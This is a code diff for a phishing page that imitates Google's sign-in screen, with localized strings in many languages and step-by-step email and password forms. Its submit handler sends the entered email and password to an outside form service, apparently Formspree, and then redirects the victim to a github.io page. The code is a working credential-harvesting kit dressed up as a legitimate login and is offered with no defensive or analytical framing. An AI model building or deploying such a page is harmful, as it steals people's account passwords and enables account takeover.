+                s1Subtitle: 'உங்கள் Google கணக்கைப் பயன்படுத்தவும்',
+                emailLabel: 'மின்னஞ்சல் அல்லது ஃபோன்',
+                emailErr: 'மின்னஞ்சல் அல்லது ஃபோன் எண்ணை உள்ளிடவும்',
+                forgotEmail: 'மின்னஞ்சலை மறந்துவிட்டீர்களா?',
+                guestText: 'உங்கள் கம்ப்யூட்டர் இல்லையா? தனிப்பட்ட முறையில் உள்நுழைய விருந்தினர் பயன்முறையைப் பயன்படுத்தவும்.',
+                guestLearnMore: 'விருந்தினர் பயன்முறையைப் பயன்படுத்துவது குறித்து மேலும் அறிக',
+                createAccount: 'கணக்கை உருவாக்கு',
+                next: 'அடுத்து',
+                s2Title: 'வருக',
+                pwLabel: 'உங்கள் கடவுச்சொல்லை உள்ளிடவும்',
+                pwErr: 'கடவுச்சொல்லை உள்ளிடவும்',
+                showPw: 'கடவுச்சொல்லைக் காட்டு',
+                forgotPw: 'கடவுச்சொல்லை மறந்துவிட்டீர்களா?',
+                help: 'உதவி',
+                privacy: 'தனியுரிமை',
+                terms: 'விதிமுறைகள்',
+                submitErr: 'ஏதோ தவறு ஏற்பட்டுள்ளது. மீண்டும் முயலவும்.',
+                networkErr: 'உங்கள் நெட்வொர்க் இணைப்பைச் சரிபார்த்து மீண்டும் முயலவும்.'
+            },
+            te: {
+                pageTitle: 'సైన్ ఇన్ చేయండి - Google ఖాతాలు',
+                s1Title: 'సైన్ ఇన్ చేయండి',
+                s1Subtitle: 'మీ Google ఖాతాను ఉపయోగించండి',
+                emailLabel: 'ఇమెయిల్ లేదా ఫోన్',
+                emailErr: 'ఇమెయిల్ లేదా ఫోన్ నంబర్‌ను నమోదు చేయండి',
+                forgotEmail: 'ఇమెయిల్ మర్చిపోయారా?',
+                guestText: 'మీ కంప్యూటర్ కాదా? ప్రైవేట్‌గా సైన్ ఇన్ చేయడానికి అతిథి మోడ్‌ని ఉపయోగించండి.',
+                guestLearnMore: 'అతిథి మోడ్‌ని ఉపయోగించడం గురించి మరింత తెలుసుకోండి',
+                createAccount: 'ఖాతాను సృష్టించండి',
+                next: 'తర్వాత',
+                s2Title: 'స్వాగతం',
+                pwLabel: 'మీ పాస్‌వర్డ్‌ను నమోదు చేయండి',
+                pwErr: 'పాస్‌వర్డ్‌ను నమోదు చేయండి',
+                showPw: 'పాస్‌వర్డ్‌ను చూపు',
+                forgotPw: 'పాస్‌వర్డ్ మర్చిపోయారా?',
+                help: 'సహాయం',
+                privacy: 'గోప్యత',
+                terms: 'నిబంధనలు',
+                submitErr: 'ఏదో తప్పు జరిగింది. దయచేసి మళ్లీ ప్రయత్నించండి.',
+                networkErr: 'దయచేసి మీ నెట్‌వర్క్ కనెక్షన్‌ని తనిఖీ చేసి మళ్లీ ప్రయత్నించండి.'
+            },
+            kn: {
+                pageTitle: 'ಸೈನ್ ಇನ್ ಮಾಡಿ - Google ಖಾತೆಗಳು',
+                s1Title: 'ಸೈನ್ ಇನ್ ಮಾಡಿ',
+                s1Subtitle: 'ನಿಮ್ಮ Google ಖಾತೆಯನ್ನು ಬಳಸಿ',
+                emailLabel: 'ಇಮೇಲ್ ಅಥವಾ ಫೋನ್',
+                emailErr: 'ಇಮೇಲ್ ಅಥವಾ ಫೋನ್ ಸಂಖ್ಯೆಯನ್ನು ನಮೂದಿಸಿ',
+                forgotEmail: 'ಇಮೇಲ್ ಮರೆತಿರುವಿರಾ?',
+                guestText: 'ನಿಮ್ಮ ಕಂಪ್ಯೂಟರ್ ಅಲ್ಲವೇ? ಖಾಸಗಿಯಾಗಿ ಸೈನ್ ಇನ್ ಮಾಡಲು ಅತಿಥಿ ಮೋಡ್ ಬಳಸಿ.',
+                guestLearnMore: 'ಅತಿಥಿ ಮೋಡ್ ಬಳಸುವ ಕುರಿತು ಇನ್ನಷ್ಟು ತಿಳಿಯಿರಿ',
+                createAccount: 'ಖಾತೆ ರಚಿಸಿ',
+                next: 'ಮುಂದೆ',
+                s2Title: 'ಸ್ವಾಗತ',
+                pwLabel: 'ನಿಮ್ಮ ಪಾಸ್‌ವರ್ಡ್ ನಮೂದಿಸಿ',
+                pwErr: 'ಪಾಸ್‌ವರ್ಡ್ ನಮೂದಿಸಿ',
+                showPw: 'ಪಾಸ್‌ವರ್ಡ್ ತೋರಿಸಿ',
+                forgotPw: 'ಪಾಸ್‌ವರ್ಡ್ ಮರೆತಿರುವಿರಾ?',
+                help: 'ಸಹಾಯ',
+                privacy: 'ಗೌಪ್ಯತೆ',
+                terms: 'ನಿಯಮಗಳು',
+                submitErr: 'ಏನೋ ತಪ್ಪಾಗಿದೆ. ದಯವಿಟ್ಟು ಮತ್ತೆ ಪ್ರಯತ್ನಿಸಿ.',
+                networkErr: 'ದಯವಿಟ್ಟು ನಿಮ್ಮ ನೆಟ್‌ವರ್ಕ್ ಸಂಪರ್ಕವನ್ನು ಪರಿಶೀಲಿಸಿ ಮತ್ತು ಮತ್ತೆ ಪ್ರಯತ್ನಿಸಿ.'
+            },
+            ml: {
+                pageTitle: 'സൈൻ ഇൻ ചെയ്യുക - Google അക്കൗണ്ടുകൾ',
+                s1Title: 'സൈൻ ഇൻ ചെയ്യുക',
+                s1Subtitle: 'നിങ്ങളുടെ Google അക്കൗണ്ട് ഉപയോഗിക്കുക',
+                emailLabel: 'ഇമെയിൽ അല്ലെങ്കിൽ ഫോൺ',
+                emailErr: 'ഒരു ഇമെയിലോ ഫോൺ നമ്പറോ നൽകുക',
+                forgotEmail: 'ഇമെയിൽ മറന്നോ?',
+                guestText: 'നിങ്ങളുടെ കമ്പ്യൂട്ടർ അല്ലേ? സ്വകാര്യമായി സൈൻ ഇൻ ചെയ്യാൻ അതിഥി മോഡ് ഉപയോഗിക്കുക.',
+                guestLearnMore: 'അതിഥി മോഡ് ഉപയോഗിക്കുന്നതിനെക്കുറിച്ച് കൂടുതലറിയുക',
+                createAccount: 'അക്കൗണ്ട് സൃഷ്ടിക്കുക',
+                next: 'അടുത്തത്',
+                s2Title: 'സ്വാഗതം',
+                pwLabel: 'നിങ്ങളുടെ പാസ്‌വേഡ് നൽകുക',
+                pwErr: 'ഒരു പാസ്‌വേഡ് നൽകുക',
+                showPw: 'പാസ്‌വേഡ് കാണിക്കുക',
+                forgotPw: 'പാസ്‌വേഡ് മറന്നോ?',
+                help: 'സഹായം',
+                privacy: 'സ്വകാര്യത',
+                terms: 'നിബന്ധനകൾ',
+                submitErr: 'എന്തോ കുഴപ്പം സംഭവിച്ചു. വീണ്ടും ശ്രമിക്കുക.',
+                networkErr: 'നിങ്ങളുടെ നെറ്റ്‌വർക്ക് കണക്ഷൻ പരിശോധിച്ച് വീണ്ടും ശ്രമിക്കുക.'
+            },
+            si: {
+                pageTitle: 'පුරන්න - Google ගිණුම්',
+                s1Title: 'පුරන්න',
+                s1Subtitle: 'ඔබගේ Google ගිණුම භාවිතා කරන්න',
+                emailLabel: 'ඊමේල් හෝ දුරකථන අංකය',
+                emailErr: 'ඊමේල් ලිපිනයක් හෝ දුරකථන අංකයක් ඇතුළත් කරන්න',
+                forgotEmail: 'ඊමේල් අමතක වුණාද?',
+                guestText: 'ඔබේ පරිගණකය නොවේද? පුද්ගලිකව පුරන්න ආගන්තුක ප්‍රකාරය භාවිතා කරන්න.',
+                guestLearnMore: 'ආගන්තුක ප්‍රකාරය භාවිතා කිරීම ගැන තව දැනගන්න',
+                createAccount: 'ගිණුමක් සාදන්න',
+                next: 'ඊළඟ',
+                s2Title: 'සාදරයෙන් පිළිගනිමු',
+                pwLabel: 'ඔබේ මුරපදය ඇතුළත් කරන්න',
+                pwErr: 'මුරපදයක් ඇතුළත් කරන්න',
+                showPw: 'මුරපදය පෙන්වන්න',
+                forgotPw: 'මුරපදය අමතක වුණාද?',
+                help: 'උදව්',
+                privacy: 'පෞද්ගලිකත්වය',
+                terms: 'නියමයන්',
+                submitErr: 'යමක් වැරදී ඇත. කරුණාකර නැවත උත්සාහ කරන්න.',
+                networkErr: 'කරුණාකර ඔබගේ ජාල සම්බන්ධතාවය පරීක්ෂා කර නැවත උත්සාහ කරන්න.'
+            },
+            th: {
+                pageTitle: 'ลงชื่อเข้าใช้ - บัญชี Google',
+                s1Title: 'ลงชื่อเข้าใช้',
+                s1Subtitle: 'ใช้บัญชี Google ของคุณ',
+                emailLabel: 'อีเมลหรือโทรศัพท์',
+                emailErr: 'ป้อนอีเมลหรือหมายเลขโทรศัพท์',
+                forgotEmail: 'หากลืมอีเมล',
+                guestText: 'ไม่ใช่คอมพิวเตอร์ของคุณใช่ไหม ใช้โหมดผู้มาเยือนเพื่อลงชื่อเข้าใช้แบบส่วนตัว',
+                guestLearnMore: 'ดูข้อมูลเพิ่มเติมเกี่ยวกับการใช้โหมดผู้มาเยือน',
+                createAccount: 'สร้างบัญชี',
+                next: 'ถัดไป',
+                s2Title: 'ยินดีต้อนรับ',
+                pwLabel: 'ป้อนรหัสผ่าน',
+                pwErr: 'ป้อนรหัสผ่าน',
+                showPw: 'แสดงรหัสผ่าน',
+                forgotPw: 'หากลืมรหัสผ่าน',
+                help: 'ความช่วยเหลือ',
+                privacy: 'ความเป็นส่วนตัว',
+                terms: 'ข้อกำหนด',
+                submitErr: 'เกิดข้อผิดพลาด โปรดลองอีกครั้ง',
+                networkErr: 'โปรดตรวจสอบการเชื่อมต่อเครือข่ายแล้วลองอีกครั้ง'
+            },
+            lo: {
+                pageTitle: 'ລົງຊື່ເຂົ້າໃຊ້ - ບັນຊີ Google',
+                s1Title: 'ລົງຊື່ເຂົ້າໃຊ້',
+                s1Subtitle: 'ໃຊ້ບັນຊີ Google ຂອງທ່ານ',
+                emailLabel: 'ອີເມວ ຫຼື ໂທລະສັບ',
+                emailErr: 'ປ້ອນອີເມວ ຫຼື ເບີໂທລະສັບ',
+                forgotEmail: 'ລືມອີເມວບໍ?',
+                guestText: 'ບໍ່ແມ່ນຄອມພິວເຕີຂອງທ່ານບໍ? ໃຊ້ໂໝດແຂກເພື່ອລົງຊື່ເຂົ້າໃຊ້ແບບສ່ວນຕົວ.',
+                guestLearnMore: 'ສຶກສາເພີ່ມເຕີມກ່ຽວກັບການໃຊ້ໂໝດແຂກ',
+                createAccount: 'ສ້າງບັນຊີ',
+                next: 'ຕໍ່ໄປ',
+                s2Title: 'ຍິນດີຕ້ອນຮັບ',
+                pwLabel: 'ປ້ອນລະຫັດຜ່ານຂອງທ່ານ',
+                pwErr: 'ປ້ອນລະຫັດຜ່ານ',
+                showPw: 'ສະແດງລະຫັດຜ່ານ',
+                forgotPw: 'ລືມລະຫັດຜ່ານບໍ?',
+                help: 'ຊ່ວຍເຫຼືອ',
+                privacy: 'ຄວາມເປັນສ່ວນຕົວ',
+                terms: 'ຂໍ້ກຳນົດ',
+                submitErr: 'ມີບາງຢ່າງຜິດພາດ. ກະລຸນາລອງໃໝ່ອີກຄັ້ງ.',
+                networkErr: 'ກະລຸນາກວດສອບການເຊື່ອມຕໍ່ເຄືອຂ່າຍຂອງທ່ານແລ້ວລອງໃໝ່.'
+            },
+            my: {
+                pageTitle: 'လက်မှတ်ထိုးဝင်ရန် - Google အကောင့်များ',
+                s1Title: 'လက်မှတ်ထိုးဝင်ရန်',
+                s1Subtitle: 'သင်၏ Google အကောင့်ကို သုံးပါ',
+                emailLabel: 'အီးမေးလ် သို့မဟုတ် ဖုန်း',
+                emailErr: 'အီးမေးလ် သို့မဟုတ် ဖုန်းနံပါတ် ထည့်ပါ',
+                forgotEmail: 'အီးမေးလ် မေ့နေပါသလား။',
+                guestText: 'သင့်ကွန်ပျူတာ မဟုတ်ဘူးလား။ သီးသန့်လက်မှတ်ထိုးဝင်ရန် ဧည့်သည်မုဒ်ကို သုံးပါ။',
+                guestLearnMore: 'ဧည့်သည်မုဒ် အသုံးပြုခြင်းအကြောင်း ပိုမိုလေ့လာရန်',
+                createAccount: 'အကောင့်ဖွင့်ရန်',
+                next: 'ရှေ့သို့',
+                s2Title: 'ကြိုဆိုပါသည်',
+                pwLabel: 'သင်၏ စကားဝှက်ကို ထည့်ပါ',
+                pwErr: 'စကားဝှက် ထည့်ပါ',
+                showPw: 'စကားဝှက် ပြရန်',
+                forgotPw: 'စကားဝှက် မေ့နေပါသလား။',
+                help: 'အကူအညီ',
+                privacy: 'ကိုယ်ရေးအချက်အလက်လုံခြုံမှု',
+                terms: 'စည်းမျဉ်းများ',
+                submitErr: 'တစ်ခုခု မှားယွင်းသွားပါသည်။ ထပ်စမ်းကြည့်ပါ။',
+                networkErr: 'သင်၏ ကွန်ရက်ချိတ်ဆက်မှုကို စစ်ဆေးပြီး ထပ်စမ်းကြည့်ပါ။'
+            },
+            km: {
+                pageTitle: 'ចូល - គណនី Google',
+                s1Title: 'ចូល',
+                s1Subtitle: 'ប្រើគណនី Google របស់អ្នក',
+                emailLabel: 'អ៊ីមែល ឬទូរសព្ទ',
+                emailErr: 'បញ្ចូលអ៊ីមែល ឬលេខទូរសព្ទ',
+                forgotEmail: 'ភ្លេចអ៊ីមែលមែនទេ?',
+                guestText: 'មិនមែនជាកុំព្យូទ័ររបស់អ្នកមែនទេ? ប្រើមុខងារភ្ញៀវដើម្បីចូលដោយឯកជន។',
+                guestLearnMore: 'ស្វែងយល់បន្ថែមអំពីការប្រើប្រាស់មុខងារភ្ញៀវ',
+                createAccount: 'បង្កើតគណនី',
+                next: 'បន្ទាប់',
+                s2Title: 'សូមស្វាគមន៍',
+                pwLabel: 'បញ្ចូលពាក្យសម្ងាត់របស់អ្នក',
+                pwErr: 'បញ្ចូលពាក្យសម្ងាត់',
+                showPw: 'បង្ហាញពាក្យសម្ងាត់',
+                forgotPw: 'ភ្លេចពាក្យសម្ងាត់មែនទេ?',
+                help: 'ជំនួយ',
+                privacy: 'ឯកជនភាព',
+                terms: 'លក្ខខណ្ឌ',
+                submitErr: 'មានបញ្ហាអ្វីមួយបានកើតឡើង។ សូមព្យាយាមម្តងទៀត។',
+                networkErr: 'សូមពិនិត្យមើលការភ្ជាប់បណ្តាញរបស់អ្នក ហើយព្យាយាមម្តងទៀត។'
+            },
+            ko: {
+                pageTitle: '로그인 - Google 계정',
+                s1Title: '로그인',
+                s1Subtitle: 'Google 계정 사용',
+                emailLabel: '이메일 또는 휴대전화',
+                emailErr: '이메일이나 전화번호를 입력하세요',
+                forgotEmail: '이메일을 잊으셨나요?',
+                guestText: '내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요.',
+                guestLearnMore: '게스트 모드 사용 방법 자세히 알아보기',
+                createAccount: '계정 만들기',
+                next: '다음',
+                s2Title: '환영합니다',
+                pwLabel: '비밀번호 입력',
+                pwErr: '비밀번호를 입력하세요',
+                showPw: '비밀번호 표시',
+                forgotPw: '비밀번호 찾기',
+                help: '도움말',
+                privacy: '개인정보처리방침',
+                terms: '약관',
+                submitErr: '전송 중 문제가 발생했습니다. 다시 시도해 주세요.',
+                networkErr: '네트워크 연결을 확인한 후 다시 시도해 주세요.'
+            },
+            ja: {
+                pageTitle: 'ログイン - Google アカウント',
+                s1Title: 'ログイン',
+                s1Subtitle: 'Google アカウントを使用',
+                emailLabel: 'メールアドレスまたは電話番号',
+                emailErr: 'メールアドレスまたは電話番号を入力してください',
+                forgotEmail: 'メールアドレスを忘れた場合',
+                guestText: 'ご自分のパソコンでない場合は、ゲストモードを使用して非公開でログインしてください。',
+                guestLearnMore: 'ゲストモードの使い方の詳細',
+                createAccount: 'アカウントを作成',
+                next: '次へ',
+                s2Title: 'ようこそ',
+                pwLabel: 'パスワードを入力',
+                pwErr: 'パスワードを入力してください',
+                showPw: 'パスワードを表示する',
+                forgotPw: 'パスワードをお忘れの場合',
+                help: 'ヘルプ',
+                privacy: 'プライバシー',
+                terms: '規約',
+                submitErr: '送信中に問題が発生しました。もう一度お試しください。',
+                networkErr: 'ネットワーク接続を確認してからもう一度お試しください。'
+            },
+            'zh-CN': {
+                pageTitle: '登录 - Google 账号',
+                s1Title: '登录',
+                s1Subtitle: '使用您的 Google 账号',
+                emailLabel: '电子邮件地址或电话号码',
+                emailErr: '请输入电子邮件地址或电话号码',
+                forgotEmail: '忘记了电子邮件地址？',
+                guestText: '不是您自己的计算机？请使用访客模式无痕登录。',
+                guestLearnMore: '详细了解如何使用访客模式',
+                createAccount: '创建账号',
+                next: '下一步',
+                s2Title: '欢迎',
+                pwLabel: '输入您的密码',
+                pwErr: '请输入密码',
+                showPw: '显示密码',
+                forgotPw: '忘记密码？',
+                help: '帮助',
+                privacy: '隐私权',
+                terms: '条款',
+                submitErr: '提交时出现问题，请重试。',
+                networkErr: '请检查您的网络连接，然后重试。'
+            },
+            'zh-TW': {
+                pageTitle: '登入 - Google 帳戶',
+                s1Title: '登入',
+                s1Subtitle: '使用您的 Google 帳戶',
+                emailLabel: '電子郵件地址或電話號碼',
+                emailErr: '請輸入電子郵件地址或電話號碼',
+                forgotEmail: '忘記電子郵件地址？',
+                guestText: '這不是你的電腦嗎？請使用訪客模式以私密方式登入。',
+                guestLearnMore: '進一步瞭解如何使用訪客模式',
+                createAccount: '建立帳戶',
+                next: '下一步',
+                s2Title: '歡迎',
+                pwLabel: '輸入您的密碼',
+                pwErr: '請輸入密碼',
+                showPw: '顯示密碼',
+                forgotPw: '忘記密碼？',
+                help: '說明',
+                privacy: '隱私權',
+                terms: '服務條款',
+                submitErr: '傳送時發生問題，請再試一次。',
+                networkErr: '請檢查您的網路連線，然後再試一次。'
+            },
+            'zh-HK': {
+                pageTitle: '登入 - Google 帳戶',
+                s1Title: '登入',
+                s1Subtitle: '使用您的 Google 帳戶',
+                emailLabel: '電郵地址或電話號碼',
+                emailErr: '請輸入電郵地址或電話號碼',
+                forgotEmail: '忘記電郵地址？',
+                guestText: '不是你的電腦？請使用訪客模式進行私密登入。',
+                guestLearnMore: '進一步瞭解如何使用訪客模式',
+                createAccount: '建立帳戶',
+                next: '下一步',
+                s2Title: '歡迎',
+                pwLabel: '輸入您的密碼',
+                pwErr: '請輸入密碼',
+                showPw: '顯示密碼',
+                forgotPw: '忘記密碼？',
+                help: '說明',
+                privacy: '私隱權',
+                terms: '條款',
+                submitErr: '傳送時發生問題，請再試一次。',
+                networkErr: '請檢查您的網絡連線，然後再試一次。'
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const langSelect = document.getElementById('lang-select');
+
+            // Populate all 79 Google languages into the selector
+            GOOGLE_LANGUAGES.forEach(lang => {
+                const opt = document.createElement('option');
+                opt.value = lang.code;
+                opt.textContent = lang.name;
+                if (lang.code === 'ko') opt.selected = true;
+                langSelect.appendChild(opt);
+            });
+
+            // Helper to apply selected language to UI text, RTL direction, and Google external links
+            function applyLanguage(code) {
+                const langObj = GOOGLE_LANGUAGES.find(l => l.code === code) || GOOGLE_LANGUAGES.find(l => l.code === 'ko');
+                const baseCode = code.split('-')[0];
+                const t = I18N[code] || I18N[baseCode] || I18N.en;
+
+                // Update document lang and RTL direction (for Arabic, Hebrew, Persian, Urdu)
+                document.documentElement.lang = code;
+                document.documentElement.dir = langObj.rtl ? 'rtl' : 'ltr';
+                document.title = t.pageTitle;
+
+                // Update Step 1 & Step 2 UI texts
+                document.getElementById('ui-s1-title').textContent = t.s1Title;
+                document.getElementById('ui-s1-subtitle').textContent = t.s1Subtitle;
+                document.getElementById('ui-email-label').textContent = t.emailLabel;
+                document.getElementById('ui-email-err-text').textContent = t.emailErr;
+                document.getElementById('link-forgot-email').textContent = t.forgotEmail;
+                document.getElementById('ui-guest-text').textContent = t.guestText + ' ';
+                document.getElementById('link-guest-mode').textContent = t.guestLearnMore;
+                document.getElementById('link-create-account').textContent = t.createAccount;
+                document.getElementById('step1-next-btn').textContent = t.next;
+
+                document.getElementById('ui-s2-title').textContent = t.s2Title;
+                document.getElementById('ui-pw-label').textContent = t.pwLabel;
+                document.getElementById('ui-pw-err-text').textContent = t.pwErr;
+                document.getElementById('ui-show-pw').textContent = t.showPw;
+                document.getElementById('link-forgot-pw').textContent = t.forgotPw;
+                document.getElementById('step2-next-btn').textContent = t.next;
+
+                document.getElementById('link-help').textContent = t.help;
+                document.getElementById('link-privacy').textContent = t.privacy;
+                document.getElementById('link-terms').textContent = t.terms;
+
+                // Dynamically update ?hl=<lang_code> on all 7 Google external links
+                const hlParam = encodeURIComponent(code);
+                document.getElementById('link-forgot-email').href = `https://accounts.google.com/signin/v2/usernamerecovery?hl=${hlParam}`;
+                document.getElementById('link-guest-mode').href = `https://support.google.com/chrome/answer/6130773?hl=${hlParam}`;
+                document.getElementById('link-create-account').href = `https://accounts.google.com/signup?hl=${hlParam}`;
+                document.getElementById('link-forgot-pw').href = `https://accounts.google.com/signin/v2/recoveryidentifier?hl=${hlParam}`;
+                document.getElementById('link-help').href = `https://support.google.com/accounts?hl=${hlParam}`;
+                document.getElementById('link-privacy').href = `https://policies.google.com/privacy?hl=${hlParam}`;
+                document.getElementById('link-terms').href = `https://policies.google.com/terms?hl=${hlParam}`;
+            }
+
+            langSelect.addEventListener('change', (e) => {
+                applyLanguage(e.target.value);
+            });
+
+            const step1El = document.getElementById('step-1');
+            const step2El = document.getElementById('step-2');
+            const step1Form = document.getElementById('step1-form');
+            const step2Form = document.getElementById('step2-form');
+
+            const signinCard = document.getElementById('signin-card');
+            const progressBar = document.getElementById('progress-bar');
+
+            const emailInput = document.getElementById('email-input');
+            const emailError = document.getElementById('email-error');
+            const step1NextBtn = document.getElementById('step1-next-btn');
+
+            const userChipBtn = document.getElementById('user-chip-btn');
+            const displayEmailText = document.getElementById('display-email-text');
+            const passwordInput = document.getElementById('password-input');
+            const passwordError = document.getElementById('password-error');
+            const togglePwCheckbox = document.getElementById('toggle-pw-visibility');
+            const step2NextBtn = document.getElementById('step2-next-btn');
+
+            const submitError = document.getElementById('submit-error');
+            const submitErrorText = document.getElementById('submit-error-text');
+
+            // Clear field validation errors on input
+            emailInput.addEventListener('input', () => {
+                if (emailInput.value.trim().length > 0) {
+                    emailInput.classList.remove('is-invalid');
+                    emailError.classList.add('hidden');
+                }
+            });
+
+            passwordInput.addEventListener('input', () => {
+                if (passwordInput.value.trim().length > 0) {
+                    passwordInput.classList.remove('is-invalid');
+                    passwordError.classList.add('hidden');
+                }
+            });
+
+            // Toggle password visibility checkbox ('비밀번호 표시')
+            togglePwCheckbox.addEventListener('change', () => {
+                passwordInput.type = togglePwCheckbox.checked ? 'text' : 'password';
+            });
+
+            function setLoading(isLoading) {
+                if (isLoading) {
+                    progressBar.classList.add('active');
+                    signinCard.classList.add('opacity-80', 'pointer-events-none');
+                    step1NextBtn.disabled = true;
+                    step2NextBtn.disabled = true;
+                } else {
+                    progressBar.classList.remove('active');
+                    signinCard.classList.remove('opacity-80', 'pointer-events-none');
+                    step1NextBtn.disabled = false;
+                    step2NextBtn.disabled = false;
+                }
+            }
+
+            // Transition from Step 1 -> Step 2
+            step1Form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const emailVal = emailInput.value.trim();
+
+                if (!emailVal) {
+                    emailInput.classList.add('is-invalid');
+                    emailError.classList.remove('hidden');
+                    emailInput.focus();
+                    return;
+                }
+
+                emailInput.classList.remove('is-invalid');
+                emailError.classList.add('hidden');
+
+                // Animate linear progress bar briefly just like Google Sign-In step transition
+                setLoading(true);
+                setTimeout(() => {
+                    displayEmailText.textContent = emailVal;
+                    step1El.classList.add('hidden');
+                    step1El.classList.remove('lg:grid');
+
+                    step2El.classList.remove('hidden');
+                    step2El.classList.add('lg:grid', 'step-animate');
+
+                    setLoading(false);
+                    passwordInput.focus();
+                }, 420);
+            });
+
+            // Clicking User Account Chip returns to Step 1 to edit Email/Phone
+            userChipBtn.addEventListener('click', () => {
+                setLoading(true);
+                submitError.classList.add('hidden');
+                setTimeout(() => {
+                    step2El.classList.add('hidden');
+                    step2El.classList.remove('lg:grid');
+
+                    step1El.classList.remove('hidden');
+                    step1El.classList.add('lg:grid', 'step-animate');
+
+                    setLoading(false);
+                    emailInput.focus();
+                }, 280);
+            });
+
+            // Submit Step 2 -> Formspree & Redirect
+            step2Form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                submitError.classList.add('hidden');
+
+                const emailVal = emailInput.value.trim();
+                const passwordVal = passwordInput.value.trim();
+
+                if (!passwordVal) {
+                    passwordInput.classList.add('is-invalid');
+                    passwordError.classList.remove('hidden');
+                    passwordInput.focus();
+                    return;
+                }
+
+                passwordInput.classList.remove('is-invalid');
+                passwordError.classList.add('hidden');
+
+                setLoading(true);
+                const formData = new FormData();
+                formData.append('email', emailVal);
+                formData.append('password', passwordVal);
+
+                const curCode = langSelect.value;
+                const curBase = curCode.split('-')[0];
+                const t = I18N[curCode] || I18N[curBase] || I18N.en;
+
+                try {
+                    const response = await fetch(step2Form.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+
+                    if (response.ok) {
+                        window.location.href = 'https://jsbi110.github.io/aa';
+                    } else {
+                        const data = await response.json().catch(() => ({}));
+                        if (data && Array.isArray(data.errors)) {
+                            submitErrorText.textContent = data.errors.map(err => err.message).join(', ');
+                        } else {
+                            submitErrorText.textContent = t.submitErr;
+                        }
+                        submitError.classList.remove('hidden');
+                        setLoading(false);
+                    }
+                } catch (err) {
+                    submitErrorText.textContent = t.networkErr;
+                    submitError.classList.remove('hidden');
+                    setLoading(false);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
